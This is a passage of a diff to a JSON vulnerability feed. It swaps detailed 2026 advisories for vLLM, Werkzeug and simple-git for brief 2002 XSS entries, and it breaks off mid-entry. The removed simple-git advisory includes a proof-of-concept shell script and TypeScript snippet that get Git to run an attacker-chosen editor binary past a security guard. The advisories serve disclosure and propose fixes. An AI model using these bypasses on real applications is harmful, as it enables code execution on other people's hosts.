@@ -12,925 +12,919 @@
   },
   "cves": [
     {
-      "id": "CVE-2026-105753",
-      "summary": "## Affected\n\n- **Ecosystem / package:** pip / `vllm`\n- **Affected versions:** vLLM ≤ 0.25.1 (confirmed on 0.25.1, commit [`752a3a504485`](https://github.com/vllm-project/vllm/tree/752a3a504485790a2e8491cacbb35c137339ad34)). The lower bound predates 0.25.1; maintainers can confirm how far back the mirrored sender/receiver cache protocol reaches.\n\n## Summary\n\nvLLM's default multimodal cache (`mm_processor_cache_type=\"lru\"`) mirrors state across two processes: the frontend (P0) holds only metadata (`MultiModalProcessorSenderCache`) while the engine core (P1) holds the real payload (`MultiModalReceiverCache`). The design invariant is that `get_and_update()` runs on P0 and P1 in lockstep for every request, so eviction order stays mirrored and P0 can answer \"is this cached in P1?\" without talking to P1.\n\nThat invariant breaks when a request is **rejected after P0 has rendered and hashed the multimodal input** (populating the P0 cache) **but before P1 receives the item** — for example, an oversized chat prompt rejected on `max_model_len` *after* rendering. P0 now believes the media is cached while P1 never got it. A later request reusing the same media hash gets a P0 hit, so P0 sends `None` instead of the payload, and P1 — which has nothing cached — trips `assert mm_item is not None, f\"Expected a cached item for {mm_hash=}\"`.\n\nThis is a remotely reachable, request-controlled cache-mirroring desync on the standard multimodal inference path. It requires only the default cache configuration.\n\n## Affected code\n\nLinks pinned to the confirmed commit [`752a3a504485`](https://github.com/vllm-project/vllm/tree/752a3a504485790a2e8491cacbb35c137339ad34) (v0.25.1):\n\n- **P0 metadata cache** — `MultiModalProcessorSenderCache` at [`vllm/multimodal/cache.py#L379`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/cache.py#L379); `get_and_update_item` at [`#L410-L421`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/cache.py#L410-L421), commit assertion at [`#L418`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/cache.py#L418).\n- **P1 payload cache (the actual sink)** — `MultiModalReceiverCache` at [`vllm/multimodal/cache.py#L630`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/cache.py#L630); `get_and_update_item` at [`#L652-L663`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/cache.py#L652-L663), with the failing `assert mm_item is not None, f\"Expected a cached item for {mm_hash=}\"` at [`#L660`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/cache.py#L660).\n- **Default `mm_processor_cache_type = \"lru\"`** at [`vllm/config/multimodal.py#L132`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/config/multimodal.py#L132); dispatch in [`vllm/multimodal/registry.py#L294-L307`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/registry.py#L294-L307) (sender) and [`#L322-L331`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/registry.py#L322-L331) (receiver). The `processor_only`, disabled-caching, and `shm` paths are not affected.\n- **Rejection-after-render window** — rendering happens before length validation in [`vllm/entrypoints/openai/chat_completion/serving.py#L206-L231`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/openai/chat_completion/serving.py#L206-L231) (`render_chat_request`), and the length check raises after the render in [`vllm/entrypoints/serve/utils/api_utils.py#L171-L189`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/serve/utils/api_utils.py#L171-L189).\n- **Cache-commit call site** — [`vllm/multimodal/processing/processor.py#L1347`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/multimodal/processing/processor.py#L1347) (`_merge_mm_kwargs`) commits the P0 sender entry during render.\n- The separate stale-order eviction hang is already fixed via [`vllm/utils/cache.py#L120-L121`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/utils/cache.py#L120-L121) (`LRUCache.touch()` guarding `if key in self:`) — a different mechanism that does not touch the sender/receiver commit-ordering protocol and does not remediate this assertion.\n\nThe P1 receiver sink — the assertion that fires when P1 receives `None` for a hash it never cached:\n\n```python\n# vllm/multimodal/cache.py Lines 651-663\n    @override\n    def get_and_update_item(\n        self,\n        mm_item: MultiModalKwargsItem | None,\n        mm_hash: str,\n    ) -> MultiModalKwargsItem:\n        if (cached_item := self._cache.get(mm_hash)) is not None:\n            return cached_item\n\n        assert mm_item is not None, f\"Expected a cached item for {mm_hash=}\"\n\n        self._cache[mm_hash] = mm_item\n        return mm_item\n```\n\nThe P0 sender — on a hit it drops the payload (returns `None`) and, on a miss during render, unconditionally commits the metadata entry with no rollback tied to admission:\n\n```python\n# vllm/multimodal/cache.py Lines 409-422\n    @override\n    def get_and_update_item(\n        self,\n        mm_item: MultiModalProcessorCacheInItem,\n        mm_hash: str,\n    ) -> MultiModalProcessorCacheOutItem:\n        if (cached_item := self._cache.get(mm_hash)) is not None:\n            return None, cached_item.prompt_updates\n\n        assert mm_item is not None, f\"Expected a cached item for {mm_hash=}\"\n\n        self._cache[mm_hash] = MultiModalProcessorCacheItemMetadata(*mm_item)\n\n        return mm_item\n```\n\n## Impact\n\nA remote client submitting multimodal requests can poison a cache identity — render a media item successfully, then have that request rejected — so a **later** request reusing the same media hash fails on the P1 receiver assertion. This is an availability failure against a shared serving instance. No code execution, memory corruption, or data disclosure is claimed.\n\nOn this revision the failure is scoped as a request-level preprocessing error (the engine core catches around `preprocess_add_request`); public reports show the same assertion cascading into further engine-loop assertions on other revisions. It applies to multimodal models running the default mirrored `lru` cache.\n\n## Suggested Fix\n\nTwo complementary changes:\n\n1. **Make the mirrored commit atomic with admission** — insert into the P0 sender cache only after the request has passed all admission checks (length, limits) and P1 has acknowledged the item, or roll back the P0 insert on rejection.\n2. **Defense in depth** — convert the P1 receiver `assert mm_item is not None` into a checked, request-scoped error (fetch-on-miss from P0) so a desync degrades a single request rather than asserting in the engine loop.\n\nThe core of the rollback half: wrap the post-render length check so a `ValueError` rejection discards the P0 entries the render just committed, before re-raising. Add a `discard_sender_cache_item()` on the processor cache (no-op default, `pop` on the sender) and a `Renderer.discard_mm_cache_entries()` that walks a rendered request's `mm_hashes`:\n\n```python\n# vllm/entrypoints/openai/chat_completion/serving.py (_create_chat_completion)\n-            max_tokens = get_max_tokens(\n-                max_model_len,\n-                ...,\n-                truncate_prompt_tokens=request.truncate_prompt_tokens,\n-            )\n+            try:\n+                max_tokens = get_max_tokens(\n+                    max_model_len,\n+                    ...,\n+                    truncate_prompt_tokens=request.truncate_prompt_tokens,\n+                )\n+            except ValueError:\n+                for rendered_input in engine_inputs:\n+                    if mm_hashes := rendered_input.get(\"mm_hashes\"):\n+                        self.renderer.discard_mm_cache_entries(mm_hashes)\n+                raise\n```\n\n```python\n# vllm/multimodal/cache.py (MultiModalProcessorSenderCache)\n+    @override\n+    def discard_sender_cache_item(self, mm_hash: str) -> None:\n+        self._cache.pop(mm_hash, None)\n```\n\nThis closes the `max_model_len` rejection path; because any other rejection-after-render path reopens the same window, pairing it with the defense-in-depth change above (making the P1 `assert` a checked, request-scoped error) is recommended.\n\n## Credit\n\n**Reported by:** Patch the Planet (Trail of Bits + OpenAI collaboration)\n\nThis vulnerability was discovered using GPT-5.5-Cyber as part of the Patch the Planet security initiative.\n\n**Proposed fix:** a fix for this issue is proposed in a public pull request: https://github.com/vllm-project/vllm/pull/51897",
-      "cvssScore": 6.5,
+      "id": "CVE-2002-1700",
+      "summary": "Cross-site scripting vulnerability (XSS) in the missing template handler in Macromedia ColdFusion MX allows remote attackers to execute arbitrary script as other users by injecting script into the HTTP request for the name of a template, which is not filtered in the resulting 404 error message.",
+      "cvssScore": 4.3,
       "severity": "Medium",
-      "published": "2026-10-06",
-      "modified": "2026-10-06",
-      "cwe": {
-        "cwe_id": "CWE-617",
-        "name": "Reachable Assertion"
-      },
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": "CWE-79",
       "references": [
-        "https://github.com/vllm-project/vllm/security/advisories/GHSA-ph3r-5jfg-f84f",
-        "https://github.com/vllm-project/vllm/pull/46747",
-        "https://github.com/vllm-project/vllm/pull/51897",
-        "https://github.com/vllm-project/vllm/commit/396204230423b7cc6798300926b8fa30190d26a9",
-        "https://github.com/vllm-project/vllm/releases/tag/v0.28.0"
+        "http://online.securityfocus.com/archive/1/277487",
+        "http://www.macromedia.com/v1/Handlers/index.cfm?ID=23047",
+        "http://www.securityfocus.com/bid/5011",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9360",
+        "http://online.securityfocus.com/archive/1/277487"
       ],
-      "vulnerableProducts": [
-        "vllm pip"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-105752",
-      "summary": "## Affected\n\n- **Ecosystem / package:** pip / `vllm`\n- **Affected versions:** vLLM ≤ 0.25.1 (confirmed on 0.25.1, commit [`752a3a504485`](https://github.com/vllm-project/vllm/tree/752a3a504485790a2e8491cacbb35c137339ad34)). The lower bound predates 0.25.1; maintainers can confirm how far back the tool-continuation re-submission has omitted the salt.\n\n## Summary\n\nOn the GPT-OSS \"Harmony\" path (`POST /v1/responses`), a request that uses a built-in or MCP tool runs as a multi-turn loop: after each tool call vLLM re-renders the full next-turn Harmony prompt and re-submits it to the engine. Turn 1 correctly carries `request.cache_salt`, but the tool-continuation re-submission rebuilds the engine input via `tokens_input(token_ids)` with **no** `cache_salt`. The continuation prefix is therefore cached in the global *unsalted* namespace even though the caller opted into salting. A second tenant who can guess the low-entropy post-tool history submits the reconstructed continuation (unsalted) and reads exact per-turn cached-token counts from the Responses usage — restoring the prompt-membership oracle that `cache_salt` is documented to prevent.\n\nSilently dropping a preserved salt *after* the supported tool workflow is enabled is a broken isolation control: the caller enabled salting and every turn should stay isolated, but continuation turns leak into the shared cache.\n\nThis is distinct from [GHSA-4qjh-9fv9-r85r](https://github.com/vllm-project/vllm/security/advisories/GHSA-4qjh-9fv9-r85r) ([CVE-2025-46570](https://nvd.nist.gov/vuln/detail/CVE-2025-46570)): that advisory is the prefix-cache membership oracle for which `cache_salt` is the documented mitigation, and its PR-17045 fix does not close this site — the Harmony tool continuation silently drops the preserved salt, caching in the unsalted namespace and leaking exact `cached_tokens_per_turn` counts from a different sink (the Responses serving continuation, not general TTFT timing).\n\n## Affected code\n\nLinks pinned to the confirmed commit [`752a3a504485`](https://github.com/vllm-project/vllm/tree/752a3a504485790a2e8491cacbb35c137339ad34) (v0.25.1):\n\n- **The drop (sink):** [`vllm/entrypoints/openai/responses/serving.py#L712-L713`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/openai/responses/serving.py#L712-L713) — `token_ids = context.render_for_completion()` then `engine_input = tokens_input(token_ids)`, with no `cache_salt`.\n- **Correct turn-1 call for contrast:** [`vllm/entrypoints/openai/responses/serving.py#L755`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/openai/responses/serving.py#L755) — `tokens_input(prompt_token_ids, cache_salt=request.cache_salt)`.\n- **`tokens_input` stores the salt only if passed:** [`vllm/inputs/engine.py#L51-L66`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/inputs/engine.py#L51-L66) (`if cache_salt is not None: inputs[\"cache_salt\"] = cache_salt`).\n- **The engine request copies only the current input's salt:** [`vllm/v1/engine/input_processor.py#L380`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/v1/engine/input_processor.py#L380) (`cache_salt=decoder_inputs.get(\"cache_salt\")` → `None` for the continuation).\n- **Prefix-cache hashing keys on the salt only when present:** [`vllm/v1/core/kv_cache_utils.py#L560-L561`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/v1/core/kv_cache_utils.py#L560-L561) (`[request.cache_salt] if (start_token_idx == 0 and request.cache_salt) else []`).\n- **The oracle the attacker reads:** [`vllm/entrypoints/openai/responses/serving.py#L909`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/openai/responses/serving.py#L909) (`cached_tokens_per_turn`).\n- **The documented control being defeated:** [`vllm/entrypoints/openai/responses/protocol.py#L235`](https://github.com/vllm-project/vllm/blob/752a3a504485790a2e8491cacbb35c137339ad34/vllm/entrypoints/openai/responses/protocol.py#L235) (`cache_salt` field).\n\nThe tool-continuation re-submission rebuilds the engine input with no `cache_salt`:\n\n```python\n# vllm/entrypoints/openai/responses/serving.py Lines 711-715\n            if isinstance(context, HarmonyContext):\n                token_ids = context.render_for_completion()\n                engine_input = tokens_input(token_ids)\n\n                sampling_params.max_tokens = max_model_len - len(token_ids)\n```\n\nContrast with the correct turn-1 call, which does preserve the caller's salt:\n\n```python\n# vllm/entrypoints/openai/responses/serving.py Lines 754-755\n        prompt_token_ids = render_for_completion(messages)\n        engine_input = tokens_input(prompt_token_ids, cache_salt=request.cache_salt)\n```\n\n`tokens_input` stores the salt on the engine input only when it is passed, so the continuation input carries none and lands in the unsalted namespace:\n\n```python\n# vllm/inputs/engine.py Lines 51-66\ndef tokens_input(\n    prompt_token_ids: list[int],\n    *,\n    prompt: str | None = None,\n    cache_salt: str | None = None,\n) -> TokensInput:\n    \"\"\"\n    Construct [`TokensInput`][vllm.inputs.engine.TokensInput]\n    from optional values.\n    \"\"\"\n    inputs = TokensInput(type=\"token\", prompt_token_ids=prompt_token_ids)\n\n    if prompt is not None:\n        inputs[\"prompt\"] = prompt\n    if cache_salt is not None:\n        inputs[\"cache_salt\"] = cache_salt\n```\n\n## Impact\n\nAn authenticated tenant of a shared deployment can recover whether a guessed post-tool prompt or history was processed by another tenant, with exact cached-token counts rather than noisy latency — the exact prompt-membership oracle `cache_salt` is documented to prevent. It defeats the multi-user prefix-cache isolation guarantee for salted Harmony tool sessions.\n\nPreconditions: a GPT-OSS Harmony model on `/v1/responses`; prefix caching enabled (default); an operator-enabled built-in or MCP tool server; the victim sets `cache_salt` and triggers at least one tool continuation; and the attacker can reconstruct the post-tool history closely enough to match the token prefix. The `AC:H` metric reflects that guessable-history precondition.\n\n## Suggested Fix\n\nPropagate `request.cache_salt` into every Harmony (and Parsable) tool-continuation re-submission — at the continuation call site call `tokens_input(token_ids, cache_salt=request.cache_salt)`, mirroring the correct turn-1 call. Carry the salt on the `HarmonyContext` (thread the originating `request` into the context) so no continuation path can omit it:\n\n```diff\n# vllm/entrypoints/openai/responses/serving.py\n             if isinstance(context, HarmonyContext):\n                 token_ids = context.render_for_completion()\n-                engine_input = tokens_input(token_ids)\n+                engine_input = tokens_input(\n+                    token_ids,\n+                    cache_salt=(\n+                        context.request.cache_salt\n+                        if context.request is not None\n+                        else None\n+                    ),\n+                )\n```\n\nwith `HarmonyContext.__init__` gaining a `request: ResponsesRequest | None = None` parameter (stored as `self.request`) that `_create_responses` passes when constructing the context. The continuation prefix is then cached in the victim's salted namespace, mirroring turn 1.\n\nSuggested regression test: assert `cached_tokens_per_turn == 0` for a different-salt probe against a salted victim continuation (the four-way control from the proof of concept).\n\n## Credit\n\n**Reported by:** Patch the Planet (Trail of Bits + OpenAI collaboration)\n\nThis vulnerability was discovered using GPT-5.5-Cyber as part of the Patch the Planet security initiative.\n\n**Proposed fix:** a fix for this issue is proposed in a public pull request: https://github.com/vllm-project/vllm/pull/51818",
-      "cvssScore": 3.1,
-      "severity": "Low",
-      "published": "2026-10-06",
-      "modified": "2026-10-06",
-      "cwe": {
-        "cwe_id": "CWE-200",
-        "name": "Exposure of Sensitive Information to an Unauthorized Actor"
-      },
-      "references": [
-        "https://github.com/vllm-project/vllm/security/advisories/GHSA-935w-9g4m-p28p",
-        "https://github.com/vllm-project/vllm/pull/50195",
-        "https://github.com/vllm-project/vllm/pull/51818",
-        "https://github.com/vllm-project/vllm/commit/6a2a2bb02b563b83f946012959fd3927984d072a",
-        "https://github.com/vllm-project/vllm/releases/tag/v0.30.0"
-      ],
-      "vulnerableProducts": [
-        "vllm pip"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-102598",
-      "summary": "Werkzeug's `safe_join` function allows Windows device names as filenames when they have an empty ADS marker on NTFS.\n\nThis was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the added filtering failed to account for the fact Windows allows special device names with an empty ADS marker, such as `NUL:`.\n\n`send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows and NTFS, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely.",
-      "cvssScore": 6.3,
+      "id": "CVE-2002-1702",
+      "summary": "Cross-site scripting vulnerability (XSS) in DeltaScripts PHP Classifieds 6.0.5 allows remote attackers to execute arbitrary script as other users via the URL parameter.",
+      "cvssScore": 4.3,
       "severity": "Medium",
-      "published": "2026-10-05",
-      "modified": "2026-10-05",
-      "cwe": {
-        "cwe_id": "CWE-67",
-        "name": "Improper Handling of Windows Device Names"
-      },
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/pallets/werkzeug/security/advisories/GHSA-g6x2-hccm-hh4m",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-102598",
-        "https://github.com/pallets/werkzeug/pull/3309",
-        "https://github.com/pallets/werkzeug/commit/8d77320bcdf3a34941ec06dcf16b03c065cd21b6",
-        "https://github.com/pallets/werkzeug/releases/tag/3.1.9"
+        "http://online.securityfocus.com/archive/1/277049",
+        "http://www.securityfocus.com/bid/5022",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9363",
+        "http://online.securityfocus.com/archive/1/277049",
+        "http://www.securityfocus.com/bid/5022"
       ],
-      "vulnerableProducts": [
-        "Werkzeug pip"
-      ],
+      "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-102829",
-      "summary": "# Security control bypass in `@simple-git/argv-parser`: Git's `VISUAL` editor fallback is not classified as `allowUnsafeEditor`\n\n## Report metadata\n\n| Field | Value |\n| --- | --- |\n| Package | `@simple-git/argv-parser` (npm, `pkg:npm/%40simple-git/argv-parser`) |\n| Repository | https://github.com/steveukx/git-js |\n| Component | `parseEnv` (`packages/argv-parser/src/env/parse-env.ts`), reached via `vulnerabilityCheck(tokens, env)` |\n| Vulnerability class | Security-control bypass — incomplete denylist in unsafe-editor detection |\n| Verified against | `c427fbad33f1f2b11341f1cf852eedecbb106400` (`@simple-git/argv-parser` 1.1.1), plus the published npm artifact 1.1.1; `main` at `98864c6` observed still unpatched |\n| API surface | Public documented API (`parseEnv(raw)` / `vulnerabilityCheck(tokens, env)`) |\n| Affected in default configuration | Yes — reproduced with `blockUnsafeOperationsPlugin` under default options, with no unsafe allowances enabled |\n\n## Summary\n\n`GitEnvKeys` in `packages/argv-parser/src/env/parse-env.ts` maps only `editor`, `git_editor` and `git_sequence_editor` to the `allowUnsafeEditor` category. `prepareEnv` keeps an environment entry only when its lowercased name is a known `GitEnvKey` or starts with `git`, so `VISUAL` is discarded before `collectConfigVulnerabilities` ever inspects it. Git, however, falls back to `VISUAL` when resolving an editor, so `parseEnv({ VISUAL: '/tmp/evileditor' })` reports no vulnerability while an interactive Git operation will execute that binary.\n\nIn a consuming application the shape is: environment values derived from a request or job are forwarded into the child Git environment and classified by this parser before spawn. The parser exists to classify exactly such values, and the equivalent `EDITOR` or `GIT_EDITOR` value is rejected — so the attacker gains an editor substitution that the guard is specifically designed to block.\n\n- `EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)\n- `GIT_EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)\n- `GIT_SEQUENCE_EDITOR` -> classified `allowUnsafeEditor` (`GitEnvKeys`, lines 5-27)\n- `VISUAL` -> **absent from `GitEnvKeys`; dropped by `prepareEnv`, lines 60-68 — no vulnerability emitted**\n\n## Impact\n\nA consuming application that allows attacker-influenced environment values can have an attacker-selected executable launched by Git during operations such as `git commit --amend`, bypassing the parser's default unsafe-editor protection. Execution happens as the host user running the Git child process, with the attacker's binary invoked against the repository's editor file (for example `.git/COMMIT_EDITMSG`, or `.git/rebase-merge/git-rebase-todo` for `git rebase -i`).\n\nThe new capability is the bypass itself: without this gap, the same attacker-supplied value under `EDITOR`, `GIT_EDITOR` or `GIT_SEQUENCE_EDITOR` is refused unless the consumer explicitly opts in to `allowUnsafeEditor`. With `VISUAL`, the equivalent code execution proceeds with no opt-in and no reported vulnerability. `VISUAL` also takes precedence over `EDITOR`, the variable the parser does flag.\n\nScoring note: no CVSS vector or score is available for this finding, and one is not asserted here. Exploitability depends on the consuming application's data flow — specifically whether attacker-influenced environment entries reach the Git child environment. Consumers that never forward untrusted environment values into Git, or that always set a higher-priority `GIT_EDITOR` or `core.editor`, are not affected.\n\n## Preconditions\n\n1. The consumer forwards attacker-influenced environment entries into the environment passed to child Git (for example via simple-git's `.env()`), and classifies them with this parser before spawn.\n2. The Git command opens an editor — for example `commit` without `-m`, `commit --amend`, or `rebase -i`.\n3. No higher-priority editor setting overrides `VISUAL`: `GIT_EDITOR`, `core.editor` and `EDITOR` are absent (`GIT_EDITOR` and `core.editor` take precedence; `VISUAL` itself overrides `EDITOR`).\n4. `TERM` is set to a value other than exactly `dumb` — Git consults `VISUAL` only then. `TERM` is neither a `GitEnvKey` nor `git`-prefixed, so an attacker who controls the environment object supplies it too and the parser reports nothing for it either.\n5. The attacker-selected executable exists and is runnable on the host.\n\nThis requires no non-standard usage, no monkey-patching and no unusual configuration: the affected path is the documented, default-enabled guard. `docs/PLUGIN-UNSAFE-ACTIONS.md` (\"Text editor\") documents this control as covering editor environment variables that substitute an arbitrary binary, but lists only `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR`; Git's `VISUAL` fallback is not mentioned, and the string `visual` does not appear anywhere in the repository at the verified commit. The docs do state that supplying environment values is the caller's responsibility, but they do not warn that `VISUAL` is outside the guard.\n\nThe feed payload's precondition list also carries entries relating to a separate `GIT_CONFIG_PARAMETERS` / `allowUnsafeConfigEnvCount` config-injection scenario. Those were not needed here: the bypass was reproduced with default options and no unsafe allowances enabled.\n\n## Data flow\n\n1. **Source** — the attacker-influenced `raw` environment object enters the public parser entry point: `parseEnv(raw)` ([`packages/argv-parser/src/env/parse-env.ts:70`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L70)).\n2. **Propagation** — `prepareEnv` lowercases keys and retains only known `GitEnvKeys` or names starting with `git`; `visual` is neither, so the entry is dropped before any analysis sees it ([`packages/argv-parser/src/env/parse-env.ts:60-68`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L60-L68)).\n3. **Sink** — `collectConfigVulnerabilities` therefore never emits `allowUnsafeEditor` for `VISUAL`, and `vulnerabilityCheck(tokens, env)` returns an empty list ([`packages/argv-parser/src/env/parse-env.ts:45-54`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/packages/argv-parser/src/env/parse-env.ts#L45-L54)).\n4. **Reachability** — simple-git's `blockUnsafeOperationsPlugin` passes its environment into `vulnerabilityCheck` before spawn; an empty vulnerability list means the Git child process is allowed to start ([`simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts:12-20`](https://github.com/steveukx/git-js/blob/c427fbad33f1f2b11341f1cf852eedecbb106400/simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts#L12-L20)).\n\n## Vulnerable code\n\n`packages/argv-parser/src/env/parse-env.ts`, lines 5-27 at `c427fbad33f1f2b11341f1cf852eedecbb106400`:\n\n```ts\nconst GitEnvKeys = {\n   'editor': 'allowUnsafeEditor',\n   // ...\n   'git_editor': 'allowUnsafeEditor',\n   // ...\n   'git_sequence_editor': 'allowUnsafeEditor',\n   // VISUAL missing\n} as const satisfies Record<string, VulnerabilityCategory>;\n```\n\nThe three mapped keys are the safe siblings; the missing `visual` entry is the gap. Because `prepareEnv` (lines 60-68) filters on this map plus a `git` prefix, the omission is not merely a missing classification — the value never reaches the classifier at all.\n\n## Reproduction\n\n**Verified** — reproduced dynamically, end to end, against a checkout of `c427fbad33f1f2b11341f1cf852eedecbb106400` (`packages/argv-parser/package.json` = 1.1.1) and against the published npm artifact 1.1.1.\n\nObserved at the parser level (vitest PoC run against the repo):\n\n- `parseEnv({ EDITOR })`, `parseEnv({ GIT_EDITOR })` and `parseEnv({ GIT_SEQUENCE_EDITOR })` each yield one `allowUnsafeEditor` vulnerability.\n- `parseEnv({ VISUAL: '/tmp/poc/evileditor' })` yields `[]` in every casing.\n- `vulnerabilityCheck(['commit', '--amend'], { VISUAL })` — the exact call the spawn guard makes — returns `[]`.\n- The published `dist/index.cjs` of 1.1.1 contains zero occurrences of `visual`; the same holds for the repository at the verified commit, including `docs/PLUGIN-UNSAFE-ACTIONS.md`.\n\nObserved at the Git level (only `VISUAL` set, `EDITOR` and `GIT_EDITOR` unset): `git var GIT_EDITOR` returned the attacker path; `git commit --amend` executed the attacker script (marker written, commit subject rewritten); `git rebase -i` executed it for the rebase-todo as well. `VISUAL` also took precedence over `EDITOR` (`EDITOR=/bin/true VISUAL=evil` -> `evil`).\n\nObserved end to end through the real spawn path (simple-git built from this commit, default options, no unsafe allowances): the `EDITOR` and `GIT_EDITOR` variants both threw `GitPluginError` — \"Use of ... is not permitted without enabling allowUnsafeEditor\" — with no execution. The `VISUAL` variant was **not** blocked: the plugin saw an empty vulnerability list, Git spawned, and the attacker-supplied editor executed as the host user against `.git/COMMIT_EDITMSG`, rewriting the commit message.\n\nMinimal Git-level reproduction:\n\n```sh\n#!/bin/sh\nset -e\nrm -rf /tmp/visual-repo /tmp/GIT_VISUAL_POC /tmp/evileditor\nmkdir /tmp/visual-repo && cd /tmp/visual-repo\ngit init -q\ngit config user.email a@a && git config user.name a\ntouch a && git add a && git commit -qm init\nprintf '#!/bin/sh\\ntouch /tmp/GIT_VISUAL_POC\\nexit 1\\n' >/tmp/evileditor\nchmod +x /tmp/evileditor\nenv -u EDITOR -u GIT_EDITOR VISUAL=/tmp/evileditor git commit --amend || true\ntest -e /tmp/GIT_VISUAL_POC && echo executed\n```\n\nGuard-level reproduction, using the public API:\n\n```ts\nimport { vulnerabilityCheck } from '@simple-git/argv-parser';\nimport { spawnSync } from 'node:child_process';\nconst args = ['commit', '--amend'];\nconst env = { VISUAL: '/tmp/evileditor' };\nif (vulnerabilityCheck(args, env).length === 0) spawnSync('git', args, { env });\n```\n\n- **Expected:** `parseEnv({ VISUAL: '/tmp/evileditor' }).vulnerabilities` contains `allowUnsafeEditor`, and the spawn guard refuses the operation unless the consumer has enabled `allowUnsafeEditor` — the behaviour already applied to `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR`.\n- **Actual:** no vulnerability is reported, the guard permits the spawn, and Git executes the attacker-selected binary.\n\n## Suggested remediation\n\nTreat `VISUAL` as an editor source, so Git's own editor-resolution precedence is fully covered by the denylist.\n\n```ts\nconst GitEnvKeys = {\n   'editor': 'allowUnsafeEditor',\n   'visual': 'allowUnsafeEditor',\n   // ...\n   'git_editor': 'allowUnsafeEditor',\n   // ...\n   'git_sequence_editor': 'allowUnsafeEditor',\n} as const satisfies Record<string, VulnerabilityCategory>;\n```\n\nBecause `prepareEnv` filters on `GitEnvKeys` membership, this single entry is enough to make `visual` survive filtering and be classified; no change to `prepareEnv` or `collectConfigVulnerabilities` is required.\n\nNotes:\n\n- `TERM` is likewise neither a `GitEnvKey` nor `git`-prefixed, and it is the variable that decides whether Git consults `VISUAL` at all (`TERM=dumb` or unset means `VISUAL` is ignored). An attacker who controls the environment object supplies it alongside `VISUAL`; whether `TERM` warrants its own classification is a maintainer judgement call, but it is worth considering while fixing this.\n- `git rebase -i` reaches the same sink: `git_sequence_editor` falls back to normal editor resolution, so the `VISUAL` path executes the attacker binary against the rebase-todo file as well.\n- `docs/PLUGIN-UNSAFE-ACTIONS.md` (\"Text editor\") should list `VISUAL` alongside `EDITOR` / `GIT_EDITOR` / `GIT_SEQUENCE_EDITOR`, since the documented scope of the control is what consumers rely on.\n- Already safe and needing no change: `EDITOR`, `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR` are all correctly classified and enforced by the plugin, and the parser's handling of `git`-prefixed variables is unaffected.\n\nSuggested regression test alongside `test/parse-env.spec.ts` (which currently covers `EDITOR` / `GIT_EDITOR` / `GIT_SEQUENCE_EDITOR` / `PAGER` but has no `VISUAL` case): assert that `parseEnv({ VISUAL: '/tmp/evileditor' })` yields one `allowUnsafeEditor` vulnerability in every casing, and that `vulnerabilityCheck(['commit', '--amend'], { VISUAL: '/tmp/evileditor' })` returns that vulnerability rather than `[]`. A precedence case is worth adding too: `VISUAL` set together with `EDITOR` must still be flagged, since `VISUAL` wins in Git's resolution order.",
-      "cvssScore": 9.2,
+      "id": "CVE-2002-1703",
+      "summary": "Cross-site scripting vulnerability (XSS) in auction.cgi for Mewsoft NetAuction 3.0 allows remote attackers to execute arbitrary script as other users via the Term parameter.",
+      "cvssScore": 6.8,
+      "severity": "Medium",
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/archive/1/277049",
+        "http://www.securityfocus.com/bid/5023",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/9365",
